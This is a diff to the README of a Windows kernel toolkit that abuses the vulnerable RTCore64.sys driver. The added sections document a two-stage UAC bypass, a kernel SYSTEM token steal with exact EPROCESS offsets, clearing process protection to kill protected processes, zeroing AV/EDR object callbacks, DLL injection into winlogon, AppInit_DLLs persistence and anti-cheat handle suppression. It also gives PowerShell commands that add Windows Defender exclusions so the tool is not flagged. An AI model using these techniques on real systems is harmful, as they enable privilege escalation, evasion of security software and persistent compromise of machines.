@@ -2,7 +2,7 @@
 
 > BYOVD-powered kernel toolkit — see what System Informer can't.
 
-Process inspection, PPL bypass, privilege escalation, service/driver enumeration, network state, ObRegisterCallbacks management, Ps\*NotifyRoutine enumeration/disable, open file handle enumeration, minifilter inspection/detach, and force USB eject via RTCore64.sys (CVE-2019-16098).
+Process inspection, PPL bypass, two-stage UAC bypass (COM + kernel token steal), kernel code patching with TLB flush, privilege escalation, service/driver enumeration, network state, ObRegisterCallbacks management, Ps\*NotifyRoutine enumeration/disable, handle enumeration/suppression, minifilter inspection/detach, and force USB eject via RTCore64.sys (CVE-2019-16098).
 
 ## Commands
 
@@ -11,12 +11,18 @@ Process inspection, PPL bypass, privilege escalation, service/driver enumeration
 |---|---|
 | `/proc` | List all processes via direct EPROCESS kernel walk — no `OpenProcess`, no ObCallback trigger |
 | `/kill <pid>` | Terminate process; auto-escalates via `EPROCESS.Protection` clear if PPL blocks |
+| `/epdump <pid>` | Dump raw EPROCESS fields for a given PID — verify offsets on non-19045 builds |
+| `/proc-token <pid>` | Full security profile: token user, session, integrity level, UAC elevation type, PPL protection byte, and complete privilege list with enabled/disabled state |
+| `/make-ppl <pid> [level]` | Set `EPROCESS.Protection` on any process to simulate PPL/PP for testing. Default `0x61` (PPL/Windows); `0x72` = PP/WinSys (highest). Confirms `OpenProcess(PROCESS_TERMINATE)` is denied after write |
 
 ### Privilege Escalation
 | Command | Description |
 |---|---|
 | `/runas system <cmd>` | Run `<cmd>` as **SYSTEM** via SeDebugPrivilege + token duplication from winlogon.exe |
 | `/runas ti <cmd>` | Run `<cmd>` as **TrustedInstaller** (above SYSTEM; can modify system files) |
+| `/elevate-self [cmd]` | Two-stage UAC bypass: **Stage 1** ICMLuaUtil COM moniker (no driver) → **Stage 2** kernel token steal if COM is blocked by AV/EDR (requires RTCore64 loaded) |
+| `/elevate-pid <pid>` | Kernel token steal — write winlogon SYSTEM token into target `EPROCESS.Token`; increments `OBJECT_HEADER.PointerCount` to prevent Bugcheck 0x18 |
+| `/enable-priv <privilege>` | Patch `SEP_TOKEN_PRIVILEGES.Present/Enabled` bitmask directly in kernel — no token duplication, no `AdjustTokenPrivileges` |
 
 ### System
 | Command | Description |
@@ -44,8 +50,9 @@ Process inspection, PPL bypass, privilege escalation, service/driver enumeration
 ### Handle Operations
 | Command | Description |
 |---|---|
-| `/handles [drive]` | Enumerate all open file handles system-wide; optionally filter by volume (e.g. `/handles E`) |
+| `/handles [filter] [--close]` | Show which processes hold open handles matching the filter; `--close` forcibly closes all matches |
 | `/handle-close <pid> <handle>` | Close a handle held by any process — uses `DuplicateHandle(DUPLICATE_CLOSE_SOURCE)` for normal processes; kernel `HANDLE_TABLE` walk + zero for `pid=4` (System) |
+| `/handle-scan <pid> [--access <mask>] [--target-pid <pid>] [--close] [--spin <ms>]` | Walk kernel `HANDLE_TABLE` for any PID; filter by access mask or target EPROCESS; `--close` zeroes entries in-place; `--spin` loops continuously for anti-cheat handle suppression |
 
 ### Minifilters
 | Command | Description |
@@ -66,6 +73,7 @@ Process inspection, PPL bypass, privilege escalation, service/driver enumeration
 | `/drv-load <path.sys>` | Load driver via HKCU registry + `NtLoadDriver` (no SCM / no UAC prompt) |
 | `/drv-unload <name> <drvobj_va>` | Force-unload a `NOT_STOPPABLE` or DKOM-hidden driver — patches `DriverUnload` to a `ret` stub then calls `sc stop` |
 | `/force-stop <name>` | Auto-find `DRIVER_OBJECT` (PsLoadedModuleList → `.data` scan) + patch `DriverUnload` + `NtUnloadDriver` |
+| `/drv-zombie <drvobj_va>` | Diagnose a driver stuck in STOP_PENDING — inspect `DriverUnload`, IRP queues, and reference counts |
 
 > **DKOM-hidden driver note:** If the target driver has removed itself from `PsLoadedModuleList` **and** `EnumDeviceDrivers` (e.g. ksafecenter64), `/force-stop` auto-discovery will fail. The driver object still lives in the `\Driver` Object Directory hash bucket — use `/objdir` to find it:
 >
@@ -84,11 +92,6 @@ Process inspection, PPL bypass, privilege escalation, service/driver enumeration
 >
 > `/objdir --kva` reads hash buckets directly via RTCore64 — DKOM cannot hide from this because the object must remain in the namespace as long as it exists.
 
-### Privilege / Token
-| Command | Description |
-|---|---|
-| `/elevate-pid <pid>` | Kernel token steal — write winlogon SYSTEM token pointer into target `EPROCESS.Token` |
-| `/enable-priv <privilege>` | Patch `SEP_TOKEN_PRIVILEGES.Present/Enabled` bitmask directly in kernel |
 
 ### Deep Scan
 | Command | Description |
@@ -101,8 +104,9 @@ Process inspection, PPL bypass, privilege escalation, service/driver enumeration
 | Command | Description |
 |---|---|
 | `/pte <addr> [--set-write] [--clear-nx] [--restore <val>]` | Walk 4-level page tables and display leaf PTE; optionally modify W/NX flags |
-| `/safepatch <addr> <hex>` | Patch kernel memory safely via shadow-page PTE swap (CoW-style, bypasses write-protect) |
+| `/safepatch <addr> <hex>` | Patch kernel read-only code pages via shadow-page PTE swap; TLB flushed with `FlushTlb()` (MapPhys + WRITE IOCTL + UnmapPhys — no `~PTE_GLOBAL` or timing hacks) |
 | `/restore <addr>` | Undo a `/safepatch`, restore original PTE mapping |
+| `/sp-test <addr>` | Four-stage safepatch diagnostic: Stage 0 HVCI check, Stage 1 PTE read, Stage 2 PTE write, Stage 3 shadow swap + verify |
 | `/ptebase` | Run all `MmPteBase` discovery methods with full diagnostics |
 | `/ptebase-set <val>` | Manually override the cached `MmPteBase` value |
 | `/rd64 <addr> [count]` | Raw kernel QWORD read |
@@ -120,6 +124,30 @@ Process inspection, PPL bypass, privilege escalation, service/driver enumeration
 | Command | Description |
 |---|---|
 | `/timedelta <pid> [ms]` | Measure transient System handles to a process (detects race-window handle injection) |
+
+### Winlogon / DLL Injection
+| Command | Description |
+|---|---|
+| `/wlmon [ms]` | Monitor winlogon.exe kernel state + loaded module list; polls at `[ms]` interval (default 1000 ms) |
+| `/wlinject <dll>` | Inject a DLL into winlogon.exe via user-mode APC queued to all winlogon threads |
+| `/wluninject <dll>` | FreeLibrary a DLL from winlogon.exe — handles refcount (loops until module disappears), auto-dismisses blocking dialogs from all desktops if loader lock is stuck |
+| `/wluninject-all <dll> [--force]` | Unload a DLL from **all** processes that have it loaded; `--force` terminates any process where FreeLibrary times out, with PPL bypass via `EPROCESS.Protection` clear if needed |
+| `/wnd [--all] [--all-desktops]` | Enumerate windows; `--all` includes invisible/no-title; `--all-desktops` spans the Winlogon and Screen-saver desktops in addition to the default desktop |
+| `/wnd-close <hwnd>` | Close/dismiss a window on any desktop (sends `WM_CLOSE` to the target HWND) |
+| `/wl-sas` | Send Secure Attention Sequence (Ctrl+Alt+Del) via `sas.dll!SendSAS(FALSE)` — useful for unlocking the workstation programmatically |
+| `/wl-persist <dll>` | Add DLL path to `AppInit_DLLs` registry key and set `LoadAppInit_DLLs=1` — DLL is injected into every process that loads user32.dll at startup |
+| `/wl-unpersist <dll>` | Remove a DLL from `AppInit_DLLs`; automatically sets `LoadAppInit_DLLs=0` if the list becomes empty |
+| `/dll-list <name>` | List every running process that currently has a DLL matching `<name>` loaded (case-insensitive substring match on filename) |
+| `/inj-scan [pid]` | Scan all processes (or a single PID) for injection artifacts: **[MOD]** DLL loaded from outside System32/SysWOW64, **[REFL]** private RX/RWX memory with MZ header (reflective DLL), **[SHELL]** private RX/RWX memory without MZ header (shellcode), **[THD]** thread whose start address falls outside all known modules (orphan thread) |
+| `/kill-ppl <pid>` | Kill a Protected Process Light — first attempts plain `TerminateProcess`; if denied, reads and zeroes `EPROCESS.Protection` byte via RTCore64, retries, and restores the original value if the kill still fails. If Protection is already 0 (non-PPL access denial), temporarily zeroes all Process ObCallback `PreOperation` pointers to bypass AV/EDR interception, then restores them |
+| `/make-ppl <pid> [level]` | Set `EPROCESS.Protection` on any process to simulate PPL/PP — for testing `/kill-ppl` without a real protected process. Default level `0x61` (PPL/Windows); use `0x72` for full PP/WinSys. Confirms `OpenProcess(PROCESS_TERMINATE)` is denied after write |
+| `/proc-token <pid>` | Full security profile for a process: token user, session ID, integrity level, UAC elevation type, PPL protection byte, and complete privilege list with enabled/disabled state |
+
+> **⚠ AppInit_DLLs warning:** Any DLL registered with `/wl-persist` (or manually via `AppInit_DLLs`) **must not** call `MessageBox`, display any UI, or perform any blocking operation from `DllMain(DLL_PROCESS_ATTACH)`. Doing so will cause modal popups in every process loading user32.dll — including the session manager and desktop window manager — which can make the system unresponsive. Use `/wl-unpersist` or clear the registry key directly to recover:
+> ```
+> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "" /f
+> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 0 /f
+> ```
 
 ### Global flags
 | Flag | Description |
@@ -140,6 +168,12 @@ ObMaster /<command> ?
 - Windows 10 x64 (tested on 22H2 build 19045)
 - Administrator privileges
 - RTCore64.sys loaded (see setup below)
+- Windows Defender exclusion for the build directory (the binary contains kernel symbol names such as `PsLoadedModuleList` and `ObRegisterCallbacks` that trigger static heuristics — Sobocat.A):
+  ```powershell
+  # Run as Administrator
+  Add-MpPreference -ExclusionPath "D:\ObMaster\build"
+  Add-MpPreference -ExclusionPath "D:\ObMaster"
+  ```
 
 ## Driver Setup
 
@@ -210,7 +244,7 @@ ObMaster
 │   ├── globals.h                  Global flags (g_jsonMode, g_quiet, g_ansiEnabled, g_debug)
 │   ├── jutil.h                    JSON string/address helpers
 │   ├── kutil.*                    Kernel helpers, EPROCESS walker, driver cache
-│   ├── cmd_proc.cpp               /proc + /kill
+│   ├── cmd_proc.cpp               /proc + /kill + /proc-token
 │   ├── cmd_drivers.cpp            /drivers
 │   ├── cmd_services.cpp           /services
 │   ├── cmd_net.cpp                /net
@@ -221,14 +255,18 @@ ObMaster
 │   ├── cmd_handles.cpp            /handles + /handle-close
 │   ├── cmd_flt.cpp                /flt + /flt-detach + /unmount
 │   ├── cmd_unload.cpp             /drv-load + /drv-unload + /force-stop
-│   ├── cmd_elevate.cpp            /elevate-pid + /enable-priv
-│   ├── cmd_handle_close.cpp       /handle-close (kernel path for pid=4)
-│   ├── pte.cpp                    MmPteBase discovery (10 methods) + PTE R/W
+│   ├── cmd_elevate.cpp            /elevate-self (2-stage) + /elevate-pid + /enable-priv + /drv-load
+│   ├── cmd_handle_close.cpp       /handle-close + /handle-scan
+│   ├── cmd_epdump.cpp             /epdump
+│   ├── cmd_drvzombie.cpp          /drv-zombie
+│   ├── pte.cpp                    MmPteBase discovery (10 methods) + PTE R/W + FlushTlb
 │   ├── patch_store.cpp            safepatch slot store
-│   ├── cmd_pte.cpp                /pte + /safepatch + /restore + /ptebase*
-│   ├── cmd_safepatch.cpp          /safepatch high-level handler
+│   ├── cmd_pte.cpp                /pte + /ptebase*
+│   ├── cmd_safepatch.cpp          /safepatch + /restore
+│   ├── cmd_sptest.cpp             /sp-test
 │   ├── cmd_guard.cpp              /guard-*
 │   ├── cmd_timedelta.cpp          /timedelta
+│   ├── cmd_winlogon.cpp           /wlmon + /wlinject + /wluninject + /wluninject-all + /wnd + /wnd-close + /wl-sas + /wl-persist + /wl-unpersist + /dll-list + /inj-scan + /kill-ppl + /make-ppl
 │   └── main.cpp
 ├── build/
 │   ├── build.bat                  Main build script
@@ -274,6 +312,63 @@ Admin process
 ```
 
 TrustedInstaller holds `SeTakeOwnershipPrivilege` and `SeRelabelPrivilege` beyond what SYSTEM has — it can overwrite WRP-protected system files.
+
+### /elevate-self two-stage technique
+
+```
+Stage 1 — ICMLuaUtil COM UAC bypass (no driver required)
+  CoGetObject("Elevation:Administrator!new:{6EDD6D74...}")
+    └─ ICMLuaUtil::ShellExec(cmd.exe, "sc start RTCore64 [& extra]")
+       └─ Elevated cmd.exe starts RTCore64 service
+
+Stage 2 — kernel token steal (fallback when Stage 1 is blocked)
+  Requires RTCore64 already loaded (e.g. by another path)
+  FindEPROCESS(winlogon) → Rd64(EPROCESS+0x4b8) → EX_FAST_REF
+    → tokenPtr = value & ~0xF         (strip inline refcnt)
+    → Wr64(tokenPtr - 0x30, count+1)  (OBJECT_HEADER.PointerCount +1)
+    → Wr64(self EPROCESS+0x4b8, tokenPtr)  (clean pointer, no cached refs)
+    → CreateProcess(extraCmd)          (child inherits SYSTEM token)
+```
+
+Skipping the `PointerCount` increment causes Bugcheck 0x18 (`REFERENCE_BY_POINTER` / `ObfDereferenceObjectWithTag`) when any syscall (e.g. `NtQueryInformationToken`) dereferences the token and the count underflows to -1.
+
+### /safepatch TLB flush
+
+After the PTE PA swap, stale TLB entries must be evicted before the patched mapping is visible. RTCore64 has no `INVLPG` or `WBINVD` opcode in any of its 18 IOCTLs (confirmed by full kd.exe disassembly). `FlushTlb(va)` uses the available IOCTLs instead:
+
+```
+MapPhys(PA, 0x1000)   → IOCTL 0x80002050 → MmMapIoSpace → fresh KVA, no TLB entry
+Wr8(mapped+offset)    → IOCTL 0x8000204C → I/O serialization write barrier
+UnmapPhys(mapped)     → IOCTL 0x80002054 → MmUnmapIoSpace → internal TLB broadcast
+```
+
+`MmUnmapIoSpace` broadcasts TLB invalidation across all CPUs as part of unmapping. No `~PTE_GLOBAL` bit manipulation or `SwitchToThread()` timing is required.
+
+### /handles filter modes
+
+`/handles` answers "what is holding this open?" for volumes, directories, and files:
+
+| Filter | Example | Matches |
+|---|---|---|
+| Drive letter | `/handles E` or `/handles E:` | All handles on that volume |
+| Directory prefix | `/handles "C:\path\to\dir"` | All handles whose NT path starts with that prefix |
+| Exact file | `/handles "C:\path\to\file.txt"` | Handles to that exact file |
+| (no filter) | `/handles` | All open file handles system-wide |
+
+`--close` appended to any form forcibly closes every matching handle via `DuplicateHandle(DUPLICATE_CLOSE_SOURCE)` — useful for unlocking a file or ejecting a volume that something refuses to release.
+
+```
+# Who is holding D:\ open?
+ObMaster /handles D --close
+
+# What has a lock on this directory?
+ObMaster /handles "D:\Projects\build"
+
+# Force-close everything holding a specific log file
+ObMaster /handles "C:\Windows\Logs\CBS\CBS.log" --close
+```
+
+Under the hood: `NtQuerySystemInformation(SystemHandleInformation)` → filter to File-type objects → `DuplicateHandle` + `GetFinalPathNameByHandle` for path resolution; volume-device handles (opened as `\\.\E:`) are caught via `IOCTL_STORAGE_GET_DEVICE_NUMBER`.
 
 ### OB_CALLBACK_ENTRY offsets
 
